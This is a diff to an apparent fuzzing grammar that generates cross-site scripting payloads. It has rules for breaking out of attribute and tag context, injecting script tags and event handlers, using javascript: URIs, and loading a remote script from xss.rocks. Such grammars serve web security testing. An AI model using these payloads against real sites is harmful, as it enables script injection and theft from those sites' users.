@@ -10,19 +10,28 @@ attack :=
 
 outbreak := 
 	+quote+,+bracket_gt+
+	/,+bracket_gt+
 	+bracket_lt+,/,+tag_html+,+bracket_gt+
+	+bracket_lt+,img+,+space+,+quote+,+quote+,+quote+,+bracket_gt+
+	+outbreak+,*,/
+	+outbreak+,/,+bracket_gt+
+	+outbreak+,/,/
+	+outbreak+,;,/,/
+	+outbreak+,-,-,+bracket_gt+
+	+outbreak+,+quote+,;
 	+outbreak+,+bracket_lt+,/,+tag_html+,+bracket_gt+
-	+bracket_lt+,img,+,+quote+,+quote+,+quote+,+bracket_gt+
 
 attacks_js :=
+	+payload_attack+,+outbreak+
 	+quote+,+space+,+event+,=,+quote+,+payload_attack+,+quote+,+bracket_gt+
+	+quote+,+space+,+event+,=,+quote+,+payload_attack+,+quote+,/,+bracket_gt+
+	\,+quote+,+payload_attack+,;,/,/
+		
+attacks_html :=
 	+bracket_lt+,+tag_script+,+bracket_gt+,+space+,+payload_attack+,+bracket_lt+,/,+tag_script+,+bracket_gt+
 	+bracket_lt+,+tag_script+,/,+random_text+,+space+,+src_attribute+,=,+quote+,http://xss.rocks/xss.js,+quote+,+bracket_gt+,+bracket_lt+,/,+tag_script+,+bracket_gt+
 	+bracket_lt+,+bracket_lt+,+tag_script+,+bracket_gt+,+payload_attack+,;,/,/,+bracket_lt+,+bracket_lt+,/,+tag_script+,+bracket_gt+
 	+bracket_lt+,+tag_script+,+space+,+src_attribute+,=,http://xss.rocks/xss.js,+bracket_lt+,+tag_html+,+bracket_gt+
-	\,+quote+,+payload_attack+,;,/,/
-	
-attacks_html :=
 	+bracket_lt+,+tag_html+,+space+,+event+,=,+quote+,+payload_attack+,+quote+,+bracket_gt+,xss,+bracket_lt+,/,+tag_html+,+bracket_gt+
 	+bracket_lt+,img,+space+,+src_attribute+,=,+src_value+,+space+,+event+,=,+quote+,+payload_attack+,+quote+,+bracket_gt+,xss,+bracket_lt+,/,img,+bracket_gt+
 	+bracket_lt+,img,+space+,+src_attribute+,=,+quote+,+tag_js+,:,+payload_attack+,;,+quote+,+bracket_gt+	
